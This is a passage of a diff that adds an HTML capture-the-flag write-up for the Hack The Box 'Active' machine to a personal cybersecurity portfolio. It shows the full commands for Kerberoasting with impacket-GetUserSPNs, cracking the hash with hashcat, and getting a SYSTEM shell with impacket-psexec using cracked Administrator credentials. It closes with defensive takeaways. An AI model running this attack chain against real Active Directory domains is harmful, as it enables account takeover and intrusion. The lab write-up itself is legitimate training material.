+                        <pre><span class="c-cmd">impacket-GetUserSPNs</span> <span class="c-val">active.htb/SVC_TGS</span>:<span class="c-url">'GPPstillStandingStrong2k18'</span> <span class="c-flag">-dc-ip</span> [TARGET IP] <span class="c-flag">-request</span></pre>
+                    </div>
+
+                    <p style="margin-left: 3.8rem; margin-bottom: 1.2rem; font-size: 0.9rem; color: var(--muted);">
+                        This returns a TGS ticket hash for the <strong style="color: var(--accent);">Administrator</strong>
+                        account — the highest value target.
+                    </p>
+
+                    <div class="step">
+                        <div class="step-num">2</div>
+                        <div class="step-body">
+                            <h4>Crack the TGS Hash</h4>
+                            <p>Save the <code>$krb5tgs$23$*</code> hash to a file and crack it with hashcat
+                                using mode 13100 (Kerberos 5 TGS-REP etype 23).</p>
+                        </div>
+                    </div>
+
+                    <div class="code-block" style="margin: 0 0 1.2rem 3.8rem;">
+                        <div class="code-bar"><i class="fas fa-terminal"></i> hashcat — cracking the TGS hash</div>
+                        <pre><span class="c-cmd">hashcat</span> <span class="c-flag">-m 13100</span> ~/Desktop/hash.txt <span class="c-val">/usr/share/wordlists/rockyou.txt</span></pre>
+                    </div>
+
+                    <div class="callout warn" style="margin-left: 3.8rem; margin-bottom: 1.2rem;">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <span>Ensure the hash is saved on a single line with no extra whitespace. The
+                            "Salt-length exception" error in hashcat usually means the hash got corrupted
+                            during copy-paste. Use <code>cat -A hash.txt</code> to verify.</span>
+                    </div>
+
+                    <div class="step">
+                        <div class="step-num">3</div>
+                        <div class="step-body">
+                            <h4>Administrator Password Cracked</h4>
+                            <p>The hash cracks quickly against rockyou.txt, revealing the Administrator password.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="cred-box">
+                    <h3><i class="fas fa-crown"></i> Administrator Credentials</h3>
+                    <div class="cred-row">
+                        <span class="cred-label">User</span>
+                        <span class="cred-value">active.htb\Administrator</span>
+                    </div>
+                    <div class="cred-row">
+                        <span class="cred-label">Password</span>
+                        <span class="cred-value">Ticketmaster1968</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 6. Root -->
+            <div class="section-block" id="s6">
+                <h2><i class="fas fa-skull-crossbones"></i> 6. Administrator Access & Root Flag</h2>
+                <p>
+                    With the Administrator credentials, we get a SYSTEM shell using <code>impacket-psexec</code>:
+                </p>
+
+                <div class="code-block">
+                    <div class="code-bar"><i class="fas fa-terminal"></i> impacket-psexec — SYSTEM shell</div>
+                    <pre><span class="c-cmd">impacket-psexec</span> <span class="c-val">active.htb/Administrator</span>:<span class="c-url">'Ticketmaster1968'</span><span class="c-highlight">@</span>[TARGET IP]</pre>
+                </div>
+
+                <div class="flag-box">
+                    <div class="flag-icon"><i class="fas fa-trophy"></i></div>
+                    <h3>Root Flag — Pwned!</h3>
+                    <p style="color: var(--muted); font-size: 0.9rem; margin-bottom: 0.5rem;">
+                        Root flag obtained from <code>C:\Users\Administrator\Desktop\root.txt</code>
+                    </p>
+                    <div class="flag-file">root.txt ✓</div>
+                </div>
+            </div>
+
+            <!-- Takeaways -->
+            <div class="takeaway-box">
+                <h3><i class="fas fa-star"></i> Key Takeaways</h3>
+                <ul>
+                    <li>Always check for anonymous/null session access on SMB shares — even "non-standard" shares like
+                        <code>Replication</code> can mirror sensitive SYSVOL content.</li>
+                    <li>GPP credentials (Groups.xml) are trivially decryptable — Microsoft published the AES key.
+                        Any legacy GPP files left on SYSVOL are free credentials.</li>
+                    <li>Service account names like <code>SVC_TGS</code> are a direct hint toward Kerberoasting —
+                        always check for SPNs on any account you compromise.</li>
+                    <li>Kerberoasting requires only basic domain user access but can yield domain admin credentials
+                        if service accounts use weak passwords.</li>
+                    <li>The entire chain (anonymous SMB → GPP decrypt → Kerberoast → SYSTEM) is a textbook
+                        Active Directory attack path that appears frequently in real engagements.</li>
+                    <li>SMB message signing was enabled (good), but it didn't prevent this attack chain which
+                        exploited credential exposure rather than relay attacks.</li>
+                </ul>
+            </div>
+
+        </article>
+
+        <!-- Sidebar -->
+        <aside class="sidebar">
+            <div class="sidebar-card">
+                <h4><i class="fas fa-list"></i> &nbsp;Table of Contents</h4>
+                <ul class="toc-list">
+                    <li><a href="#s1">1. Setup</a></li>
+                    <li><a href="#s2">2. Enumeration</a></li>
+                    <li><a href="#s3">3. GPP Credential Abuse</a></li>
+                    <li><a href="#s4">4. Foothold &amp; User Flag</a></li>
+                    <li><a href="#s5">5. Kerberoasting</a></li>
+                    <li><a href="#s6">6. Root Flag</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-card">
+                <h4><i class="fas fa-tag"></i> &nbsp;Vulnerability Classes</h4>
+                <span class="skill-pill red">SMB Null Session</span>
+                <span class="skill-pill red">GPP cPassword</span>
+                <span class="skill-pill red">Kerberoasting</span>
+                <span class="skill-pill red">Weak Passwords</span>
+                <span class="skill-pill red">Active Directory</span>
+            </div>
+
+            <div class="sidebar-card">
+                <h4><i class="fas fa-tools"></i> &nbsp;Tools Used</h4>
+                <span class="skill-pill">nmap</span>
+                <span class="skill-pill">enum4linux</span>
+                <span class="skill-pill">smbclient</span>
+                <span class="skill-pill">smbmap</span>
+                <span class="skill-pill">gpp-decrypt</span>
+                <span class="skill-pill">impacket</span>
+                <span class="skill-pill">hashcat</span>
+            </div>
+
+            <div class="sidebar-card">
+                <h4><i class="fas fa-network-wired"></i> &nbsp;Attack Chain</h4>
+                <div style="font-size: 0.83rem; line-height: 2.2; color: var(--muted);">
+                    <div style="color: var(--red);">① SMB null session</div>
+                    <div style="padding-left: 0.8rem; color: var(--muted);">↓ anonymous share access</div>
+                    <div style="color: var(--red);">② Groups.xml discovered</div>
+                    <div style="padding-left: 0.8rem; color: var(--muted);">↓ gpp-decrypt cPassword</div>
+                    <div style="color: var(--red);">③ SVC_TGS credentials</div>
+                    <div style="padding-left: 0.8rem; color: var(--muted);">↓ authenticated SMB access</div>
+                    <div style="color: var(--red);">④ Kerberoast Administrator</div>
+                    <div style="padding-left: 0.8rem; color: var(--muted);">↓ crack TGS hash</div>
+                    <div style="color: var(--red);">⑤ PsExec → SYSTEM shell</div>
+                    <div style="padding-left: 0.8rem; color: var(--muted);">↓</div>
+                    <div style="color: var(--green);">⑥ 🚩 Flags captured</div>
+                </div>
+            </div>
+        </aside>
+
+    </div>
+
+    <footer>
+        <p>
+            <a href="../index.html"><i class="fas fa-arrow-left"></i> Back to Portfolio</a>
+            &nbsp;·&nbsp;
+            PLSCARRYME Cybersecurity Portfolio &copy; 2025
+        </p>
+    </footer>
+
+    <script>
+        window.addEventListener('scroll', () => {
+            const doc = document.documentElement;
+            const scrolled = doc.scrollTop / (doc.scrollHeight - doc.clientHeight) * 100;
+            document.getElementById('progress').style.width = scrolled + '%';
+        });
+    </script>
+
+</body>
+
+</html>
